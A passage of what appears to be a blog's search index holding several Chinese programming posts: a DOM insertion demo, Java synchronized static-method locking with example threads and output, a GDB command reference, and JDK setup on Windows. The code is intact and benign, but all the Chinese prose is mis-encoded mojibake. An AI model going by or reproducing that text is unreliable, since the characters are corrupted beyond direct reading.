class="keyword">var</span> p_insert = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="actionscript">            p_insert.innerHTML = <span class="string">"è¿™æ˜¯é€šè¿‡insertæ–¹æ³•æ’å…¥çš„"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// å°†p_insertèŠ‚ç‚¹æ’å…¥åˆ°pèŠ‚ç‚¹ä¹‹å‰ï¼ˆid = p_5ï¼‰</span></span></span><br><span class="line">            div.insertBefore(p_insert, p);</span><br><span class="line"><span class="actionscript">            <span class="comment">// åˆ é™¤divçš„å­èŠ‚ç‚¹pï¼ˆid = p_5ï¼‰</span></span></span><br><span class="line">            div.removeChild(p);</span><br><span class="line">        &#125;</span><br><span class="line">        demo();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>JavaScriptåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaä¸­ç»™é™æ€æ–¹æ³•æ·»åŠ synchronizedæ—¶å€™çš„é”</title>
    <url>/2020/10/29/Java%E4%B8%AD%E7%BB%99%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%B7%BB%E5%8A%A0synchronized%E6%97%B6%E5%80%99%E7%9A%84%E9%94%81/</url>
    <content><![CDATA[<p>åœ¨<code>java</code>é™æ€æ–¹æ³•ä¸Šé¢åŠ <code>synchronized</code>çš„æ—¶å€™ï¼Œæ˜¯æŠŠå½“å‰ç±»çš„<code>Class</code>ç±»å¯¹è±¡è¿›è¡ŒæŒé”ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</p>
<p><code>Service.java</code>ï¼šåˆ†åˆ«æä¾›ä¸¤ä¸ªé™æ€æ–¹æ³•å’Œä¸€ä¸ªéé™æ€æ–¹æ³•<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šYalexin</span></span><br><span class="line"><span class="comment"> * Emailï¼š 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" è¿›å…¥ printA()"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" é€€å‡º printA()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" è¿›å…¥ printB()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" é€€å‡º printB()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" è¿›å…¥ printC()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" åœ¨ "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" é€€å‡º printC()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çº¿ç¨‹Aè°ƒç”¨é™æ€æ–¹æ³•A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šYalexin</span></span><br><span class="line"><span class="comment"> * Emailï¼š 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadA</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadA</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printA();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çº¿ç¨‹Bè°ƒç”¨é™æ€æ–¹æ³•B</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šYalexin</span></span><br><span class="line"><span class="comment"> * Emailï¼š 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadB</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadB</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printB();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›ç¨‹Cè°ƒç”¨éé™æ€æ–¹æ³•C</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authorï¼šYalexin</span></span><br><span class="line"><span class="comment"> * Emailï¼š 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadC</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadC</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">thread name = AAAA åœ¨ <span class="number">1603940400153</span> è¿›å…¥ printA()</span><br><span class="line">thread name = CCCC åœ¨ <span class="number">1603940400153</span> è¿›å…¥ printC()</span><br><span class="line">thread name = CCCC åœ¨ <span class="number">1603940400153</span> é€€å‡º printC()</span><br><span class="line">thread name = AAAA åœ¨ <span class="number">1603940402169</span> é€€å‡º printA()</span><br><span class="line">thread name = BBBB åœ¨ <span class="number">1603940402169</span> è¿›å…¥ printB()</span><br><span class="line">thread name = BBBB åœ¨ <span class="number">1603940402169</span> é€€å‡º printB()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°</p>
<p>Aæ–¹æ³•å’ŒBæ–¹æ³•æ˜¯åŒæ­¥çš„ï¼Œæ˜¯å› ä¸º<code>synchronized</code>å…³é”®å­—åŠ åˆ°é™æ€æ–¹æ³•ä¸Šé¢çš„æ—¶å€™ï¼Œæ˜¯å°†<code>Service</code>ç±»çš„<code>Class</code>ç±»å¯¹è±¡ä½œä¸ºé”ï¼Œè€ŒCæ–¹æ³•å’ŒAæˆ–è€…Bæ–¹æ³•æ˜¯å¼‚æ­¥çš„ï¼Œæ˜¯å› ä¸º<code>synchronized</code>å…³é”®å­—åŠ åˆ°éé™æ€æ–¹æ³•ä¸Šé¢çš„æ—¶å€™ï¼Œæ˜¯å°†<code>Service</code>ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ä½œä¸ºé”ï¼Œå³Cæ–¹æ³•çš„é”å’ŒAæˆ–Bçš„é”æ˜¯ä¸¤ä¸ªä¸åŒçš„é”ï¼ŒäºŒè€…å¯ä»¥å¼‚æ­¥è¿›è¡Œã€‚</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>å¤šçº¿ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxä¸‹ä½¿ç”¨GDBè°ƒè¯•Cç¨‹åº</title>
    <url>/2020/04/15/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95C%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>åœ¨Windowsä¸Šåˆ©ç”¨vs codeç­‰IDEï¼ˆè™½ç„¶æ˜¯vs codeä¸èƒ½ç®—å¾—ä¸ŠIDEï¼‰æ˜¯å¾ˆæ–¹ä¾¿è¿›è¡Œç¨‹åºçš„è°ƒè¯•ï¼Œä½†æ˜¯åœ¨æ²¡æœ‰å›¾å½¢ç•Œé¢çš„Linuxç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œè°ƒè¯•ï¼Ÿç­”æ¡ˆå°±æ˜¯å€ŸåŠ©<code>GDB</code>ç±»ä¼¼çš„è°ƒè¯•å™¨ã€‚</p>
<blockquote>
<p>æ–‡ç« æ‘˜å½•è‡ª<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/" target="_blank" rel="noopener">linux tools quick tutoril</a>ä¸­çš„<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html" target="_blank" rel="noopener">gdbè°ƒè¯•åˆ©å™¨</a></p>
</blockquote>
<a id="more"></a>GDBæ˜¯ä¸€ä¸ªç”±GNUå¼€æºç»„ç»‡å‘å¸ƒçš„ã€UNIX/LINUXæ“ä½œç³»ç»Ÿä¸‹çš„ã€åŸºäºå‘½ä»¤è¡Œçš„ã€åŠŸèƒ½å¼ºå¤§çš„ç¨‹åºè°ƒè¯•å·¥å…·ã€‚

<p>å¯¹äºä¸€åLinuxä¸‹å·¥ä½œçš„c++ç¨‹åºå‘˜ï¼Œgdbæ˜¯å¿…ä¸å¯å°‘çš„å·¥å…·ï¼›</p>
<p>æœ‰äº›ç³»ç»Ÿæ²¡æœ‰é»˜è®¤å®‰è£…ï¼Œéœ€è¦è‡ªå·±å®‰è£…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gdb</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªcç¨‹åºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹C/C++ç¨‹åºçš„è°ƒè¯•ï¼Œéœ€è¦åœ¨ç¼–è¯‘å‰å°±åŠ ä¸Š-gé€‰é¡¹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -g hello.c -o hello  # C++ç¨‹åºä½¿ç”¨g++</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•å¯æ‰§è¡Œæ–‡ä»¶:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gdb hello</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›å…¥äº¤äº’ç•Œé¢ï¼Œé€šè¿‡ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œè°ƒè¯•ï¼š</p>
<p>è¿è¡Œç±»å‘½ä»¤ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>runï¼Œç®€å†™r</td>
<td>è¿è¡Œç¨‹åºï¼Œå½“é‡åˆ°æ–­ç‚¹åï¼Œç¨‹åºä¼šåœ¨æ–­ç‚¹å¤„åœæ­¢è¿è¡Œï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥ä¸‹ä¸€æ­¥çš„å‘½ä»¤ã€‚</td>
</tr>
<tr>
<td>continue ç®€å†™c</td>
<td>ç»§ç»­æ‰§è¡Œï¼Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹å¤„ï¼ˆæˆ–è¿è¡Œç»“æŸï¼‰</td>
</tr>
<tr>
<td>step ç®€å†™s</td>
<td>å•æ­¥è°ƒè¯•å¦‚æœæœ‰å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥å‡½æ•°ï¼›</td>
</tr>
<tr>
<td>next ç®€å†™n</td>
<td>å•æ­¥è·Ÿè¸ªç¨‹åºï¼Œå½“é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œä¹Ÿä¸è¿›å…¥æ­¤å‡½æ•°ä½“ï¼›æ­¤å‘½ä»¤åŒ step çš„ä¸»è¦åŒºåˆ«æ˜¯ï¼Œstep é‡åˆ°ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå°†æ­¥è¿›åˆ°å‡½æ•°ä¸­å»è¿è¡Œï¼Œè€Œ next åˆ™ç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œä¸ä¼šè¿›å…¥åˆ°å‡½æ•°ä½“å†…</td>
</tr>
<tr>
<td>until</td>
<td>å½“ä½ åŒå€¦äº†åœ¨ä¸€ä¸ªå¾ªç¯ä½“å†…å•æ­¥è·Ÿè¸ªæ—¶ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥è¿è¡Œç¨‹åºç›´åˆ°é€€å‡ºå¾ªç¯ä½“</td>
</tr>
<tr>
<td>until+è¡Œå·</td>
<td>è¿è¡Œè‡³æŸè¡Œï¼Œä¸ä»…ä»…ç”¨æ¥è·³å‡ºå¾ªç¯</td>
</tr>
<tr>
<td>finish</td>
<td>è¿è¡Œç¨‹åºï¼Œç›´åˆ°å½“å‰å‡½æ•°å®Œæˆè¿”å›ï¼Œå¹¶æ‰“å°å‡½æ•°è¿”å›æ—¶çš„å †æ ˆåœ°å€å’Œè¿”å›å€¼åŠå‚æ•°å€¼ç­‰ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td>call å‡½æ•°(å‚æ•°)</td>
<td>è°ƒç”¨ç¨‹åºä¸­å¯è§çš„å‡½æ•°ï¼Œå¹¶ä¼ é€’â€œå‚æ•°â€ï¼Œå¦‚ï¼šcall gdb_test(55)</td>
</tr>
<tr>
<td>quitç®€å†™q</td>
<td>æ¨å‡ºgdbäº¤äº’ç•Œé¢</td>
</tr>
</tbody></table>
<p>è®¾ç½®æ–­ç‚¹ç±»ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>break n ç®€å†™ b n</td>
<td>åœ¨ç¨‹åºçš„ç¬¬nè¡Œè®¾ç½®æ–­ç‚¹</td>
</tr>
<tr>
<td>b  n if conditions</td>
<td>æ»¡è¶³conditionsæ¡ä»¶æ—¶å€™åœ¨ç¬¬nè¡Œè®¾ç½®æ–­ç‚¹</td>
</tr>
<tr>
<td>b functionName</td>
<td>åœ¨å‡½æ•°functionName()çš„å…¥å£å¤„è®¾ç½®æ–­ç‚¹</td>
</tr>
<tr>
<td>delete n</td>
<td>åˆ é™¤ç¬¬nä¸ªæ–­ç‚¹</td>
</tr>
<tr>
<td>clear n</td>
<td>æ¸…é™¤ç¬¬nè¡Œçš„æ–­ç‚¹ æ³¨æ„å’Œdeleteçš„åŒºåˆ«ï¼Œåˆ é™¤å‡½æ•°çš„å…¥å£æ–­ç‚¹ä¹Ÿæ˜¯ä½¿ç”¨è¯¥å‘½ä»¤</td>
</tr>
<tr>
<td>disable n</td>
<td>æš‚åœç¬¬nä¸ªæ–­ç‚¹</td>
</tr>
<tr>
<td>enable n</td>
<td>å¼€å¯ç¬¬nä¸ªæ–­ç‚¹</td>
</tr>
<tr>
<td>info b</td>
<td>æ˜¾ç¤ºå½“å‰ç¨‹åºçš„æ–­ç‚¹è®¾ç½®æƒ…å†µ</td>
</tr>
<tr>
<td>delete breakpoints</td>
<td>æ¸…é™¤æ‰€æœ‰æ–­ç‚¹</td>
</tr>
</tbody></table>
<p>æŸ¥çœ‹æºä»£ç ç±»ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>list ç®€å†™l</td>
<td>åˆ—å‡ºç¨‹åºçš„æºä»£ç ï¼Œé»˜è®¤æ¯æ¬¡æ˜¾ç¤º10è¡Œã€‚<br>å†æ¬¡è¾“å…¥åˆ™å°†ä»ä¸Šæ¬¡è¾“å‡ºçš„ä½ç½®å¼€å§‹è¾“å‡º<br><strong>æ³¨æ„ï¼š</strong>ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºçš„æ—¶å€™å¦‚æœæ²¡æœ‰åŠ ä¸Š<code>-g</code>é€‰é¡¹çš„è¯ï¼Œè¯¥å‘½ä»¤æ˜¯ä¸èƒ½å¤Ÿæ‰§è¡Œçš„</td>
</tr>
<tr>
<td>list n</td>
<td>å°†æ˜¾ç¤ºå½“å‰æ–‡ä»¶ä»¥ç¬¬nè¡Œä¸ºä¸­å¿ƒçš„å‰å10è¡Œä»£ç ï¼Œå¦‚ï¼šlist 5</td>
</tr>
<tr>
<td>list functionName</td>
<td>å°†æ˜¾ç¤ºâ€œå‡½æ•°åâ€æ‰€åœ¨å‡½æ•°çš„æºä»£ç ï¼Œå¦‚ï¼šlist main   æˆ–è€… list test</td>
</tr>
</tbody></table>
<p>æ‰“å°è¡¨è¾¾å¼ç±»ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>print è¡¨è¾¾å¼</td>
<td>è¡¨è¾¾å¼å¯ä»¥æ˜¯ç¨‹åºä¸­çš„å˜é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±å®šä¹‰çš„è¡¨è¾¾å¼ï¼Œå¦‚<br><code>print 2 * 2</code>ï¼Œç±»ä¼¼äºCè¯­è¨€çš„<code>printf</code>å‡½æ•°</td>
</tr>
<tr>
<td>print func_name(p1,p1,â€¦)</td>
<td>ä¾‹å¦‚ï¼Œè°ƒç”¨æ±‚å’Œå‡½æ•°å¹¶ä¸”æ‰“å°ç»“æœ<code>print sum(1,2,3)</code></td>
</tr>
<tr>
<td>display è¡¨è¾¾å¼</td>
<td>å•æ­¥è¿è¡Œæ—¶æ¯æ‰§è¡Œä¸€æ­¥éƒ½æ‰“å°è¡¨ç¤ºå¼çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td>info locals</td>
<td>æ˜¾ç¤ºå½“å‰å †æ ˆé¡µçš„æ‰€æœ‰å˜é‡</td>
</tr>
</tbody></table>
<p>æŸ¥è¯¢è¿è¡Œä¿¡æ¯</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>where/bt</td>
<td>å½“å‰è¿è¡Œçš„å †æ ˆåˆ—è¡¨</td>
</tr>
<tr>
<td>bt backtrace</td>
<td>æ˜¾ç¤ºå½“å‰è°ƒç”¨å †æ ˆ</td>
</tr>
<tr>
<td>up/down</td>
<td>æ”¹å˜å †æ ˆæ˜¾ç¤ºçš„æ·±åº¦</td>
</tr>
<tr>
<td>set args å‚æ•°</td>
<td>æŒ‡å®šè¿è¡Œæ—¶çš„å‚æ•°</td>
</tr>
<tr>
<td>show args</td>
<td>æŸ¥çœ‹è®¾ç½®å¥½çš„å‚æ•°</td>
</tr>
<tr>
<td>info program</td>
<td>æ¥æŸ¥çœ‹ç¨‹åºçš„æ˜¯å¦åœ¨è¿è¡Œï¼Œè¿›ç¨‹å·ï¼Œè¢«æš‚åœçš„åŸå› ã€‚</td>
</tr>
</tbody></table>
<p>åˆ†å‰²çª—å£</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>layout</td>
<td>ç”¨äºåˆ†å‰²çª—å£ï¼Œå¯ä»¥ä¸€è¾¹æŸ¥çœ‹ä»£ç ï¼Œä¸€è¾¹æµ‹è¯•</td>
</tr>
<tr>
<td>layout src</td>
<td>æ˜¾ç¤ºæºä»£ç çª—å£</td>
</tr>
<tr>
<td>layout asm</td>
<td>æ˜¾ç¤ºåæ±‡ç¼–çª—å£</td>
</tr>
<tr>
<td>layout regs</td>
<td>æ˜¾ç¤ºæºä»£ç /åæ±‡ç¼–å’ŒCPUå¯„å­˜å™¨çª—å£</td>
</tr>
<tr>
<td>layout split</td>
<td>æ˜¾ç¤ºæºä»£ç å’Œåæ±‡ç¼–çª—å£</td>
</tr>
<tr>
<td>Ctrl + L</td>
<td>åˆ·æ–°çª—å£</td>
</tr>
</tbody></table>
<p>*<em>äº¤äº’æ¨¡å¼ä¸‹ç›´æ¥å›è½¦çš„ä½œç”¨æ˜¯é‡å¤ä¸Šä¸€æŒ‡ä»¤ï¼Œå¯¹äºå•æ­¥è°ƒè¯•éå¸¸æ–¹ä¾¿ï¼› *</em></p>
]]></content>
      <categories>
        <category>Linuxç›¸å…³</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>å‘½ä»¤è¡Œ</tag>
        <tag>æ•™ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaçš„ç¯å¢ƒé…ç½®ï¼ˆWindowsç³»ç»Ÿï¼‰</title>
    <url>/2020/04/07/Java%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="ä¸‹è½½å®‰è£…jdk"><a href="#ä¸‹è½½å®‰è£…jdk" class="headerlink" title="ä¸‹è½½å®‰è£…jdk"></a>ä¸‹è½½å®‰è£…jdk</h2><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">ç”²éª¨æ–‡å®˜ç½‘</a></p>
<p>ä»ç”²éª¨æ–‡ä¸‹è½½å¥½åï¼Œå®‰è£…è¿‡ç¨‹æŠŠå®‰è£…çš„è·¯å¾„è®°ä½ï¼Œæˆ–è€…æ›´æ”¹åˆ°è‡ªå·±å–œæ¬¢çš„è·¯å¾„ã€‚</p>
<h2 id="æ–°å»ºç³»ç»Ÿå˜é‡"><a href="#æ–°å»ºç³»ç»Ÿå˜é‡" class="headerlink" title="æ–°å»ºç³»ç»Ÿå˜é‡"></a>æ–°å»ºç³»ç»Ÿå˜é‡</h2><p>å³å‡»â€œæ­¤ç”µè„‘â€ï¼Œä¾æ¬¡ç‚¹å‡»â€œå±æ€§â€ï¼Œâ€œé«˜çº§ç³»ç»Ÿè®¾ç½®â€ï¼Œâ€œç¯å¢ƒå˜é‡â€ï¼Œåœ¨â€œç³»ç»Ÿå˜é‡â€å¤„æ–°å»ºä»¥ä¸‹å˜é‡ï¼š<a id="more"></a></p>
<table>
<thead>
<tr>
<th>å˜é‡å</th>
<th>å˜é‡å€¼</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_HOME</td>
<td>jdkçš„ä½ç½®ï¼Œå¦‚<code>D:\Java\jdk-14</code></td>
</tr>
<tr>
<td>CLASSPATH</td>
<td><code>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</code></td>
</tr>
</tbody></table>
<p> <strong>jdk1.5ç‰ˆæœ¬ä»¥ä¸Šä¸éœ€è¦è®¾ç½®<code>CLASSPATH</code>å˜é‡</strong></p>
<p>å¦‚æœåœ¨<code>jdk</code>å®‰è£…ç›®å½•ä¸‹æ²¡æœ‰<code>jre</code>çš„æ–‡ä»¶ä¸‹ï¼Œåªè¦åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¿›å…¥è¯¥<code>jdk</code>çš„å®‰è£…ç›®å½•ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥ç”Ÿæˆäº†<code>jre</code>çš„ç›¸å…³æ–‡ä»¶äº†ã€‚</p>
<p>ç„¶ååœ¨<code>path</code>å˜é‡ä¸­æ·»åŠ ä¸¤æ¡å˜é‡å€¼ï¼š</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586233918848.png" alt="1586233918848"></p>
<p>å¹¶ä¸”<code>%JAVA_HOME%\bin</code>å¿…é¡»åœ¨å‰é¢ï¼Œå¦åˆ™å¯èƒ½å‡ºç°ä¸‹é¢è¿™ç§é”™è¯¯ï¼š</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586234001560.png" alt="1586234001560"></p>
<h2 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h2><p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œèƒ½æ­£å¸¸æ˜¾ç¤ºç‰ˆæœ¬å·å°±è¯´æ˜ç¯å¢ƒé…ç½®æˆåŠŸäº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>RMQé—®é¢˜ä¹‹STè¡¨</title>
    <url>/2021/04/28/RMQ%E9%97%AE%E9%A2%98%E4%B9%8BST%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>ST</code>è¡¨å’Œçº¿æ®µæ ‘ç±»ä¼¼ï¼Œç”¨äºå¿«é€Ÿæ±‚è§£åŒºé—´é—®é¢˜ï¼ŒäºŒè€…çš„å»ºç«‹æ—¶é—´éƒ½æ˜¯<code>O(nlogn)</code>ï¼Œä½†æ˜¯<code>ST</code>è¡¨æŸ¥è¯¢çš„æ—¶é—´è¾¾åˆ°äº†<code>O(1)</code>ï¼Œè™½ç„¶è¯´ä¸æ”¯æŒåŒºé—´æ›´æ–°ï¼Œçº¿æ®µæ ‘æ”¯æŒæ›´æ–°ï¼Œæ›´æ–°èŠ±è´¹æ—¶é—´<code>O(logn)</code>ï¼ŒæŸ¥è¯¢èŠ±è´¹<code>O(logn)</code><a id="more"></a></p>
<h2 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h2><ul>
<li><code>RMQ</code>:<code>Range Minimum/Maximum Query</code>ï¼Œ ä¸­æ–‡ä¸ºåŒºé—´æœ€å€¼æŸ¥è¯¢ ã€‚</li>
